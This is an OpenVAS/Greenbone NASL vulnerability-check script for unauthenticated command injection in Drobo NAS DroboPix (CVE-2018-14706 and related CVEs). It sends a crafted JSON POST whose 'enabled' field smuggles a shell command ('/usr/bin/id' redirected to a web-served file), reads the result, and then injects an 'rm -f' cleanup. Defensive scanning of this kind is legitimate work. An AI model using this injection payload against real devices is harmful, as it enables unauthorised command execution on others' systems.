# Copyright (C) 2019 Greenbone Networks GmbH
# Text descriptions are largely excerpted from the referenced
# advisory, and are Copyright (C) of the respective author(s)
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142109");
  script_version("2019-04-08T08:02:40+0000");
  script_tag(name:"last_modification", value:"2019-04-08 08:02:40 +0000 (Mon, 08 Apr 2019)");
  script_tag(name:"creation_date", value:"2019-03-08 14:41:22 +0700 (Fri, 08 Mar 2019)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2018-14702", "CVE-2018-14706", "CVE-2018-14707");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("Drobo NAS Multiple Vulnerabilities in DroboPix");

  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_drobo_nas_consolidation.nasl");
  script_mandatory_keys("drobo/drobopix/detected");

  script_tag(name:"summary", value:"Drobo NAS are prone to multiple vulnerabilities in DroboPix.");

  script_tag(name:"insight", value:"Drobo NAS are prone to multiple vulnerabilities in DroboPix:

  - Unauthenticated Access to device info via Drobo Pix API drobo.php (CVE-2018-14702)

  - Unauthenticated Command Injection in DroboPix (CVE-2018-14706)

  - Unauthenticated Arbitrary File Upload in DroboPix (CVE-2018-14707)");

  script_tag(name:"solution", value:"No known solution is available as of 08th April, 2019.
  Information regarding this issue will be updated once solution details are available.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_xref(name:"URL", value:"https://blog.securityevaluators.com/call-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_kb_item("drobo/drobopix/port"))
  exit(0);

vt_strings = get_vt_strings();
file = vt_strings["default_rand"];

url = "/DroboPix/api/drobopix/demo";
data = '{"enabled":"false' + "';/usr/bin/id > /mnt/DroboFS/Shares/DroboApps/DroboPix/www/" + file + ' #"}';

req = http_post(port: port, item: url, data: data);
res = http_keepalive_send_recv(port: port, data: req);

if (res !~ "^^HTTP/1\.[01] 200")
  exit(0);

test_url = "/DroboPix/" + file;

req = http_get(port: port, item: test_url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if (res =~ 'uid=[0-9]+.*gid=[0-9]+') {
  report = 'It was possible to execute the "id" command.\n\nResult:\n\n' + res;
  security_message(port: port, data: report);

  # Cleanup
  data = '{"enabled":"false' + "';/bin/rm -f /mnt/DroboFS/Shares/DroboApps/DroboPix/www/" + file + ' #"}';

  req = http_post(port: port, item: url, data: data);
  http_keepalive_send_recv(port: port, data: req);

  exit(0);
}

exit(0);
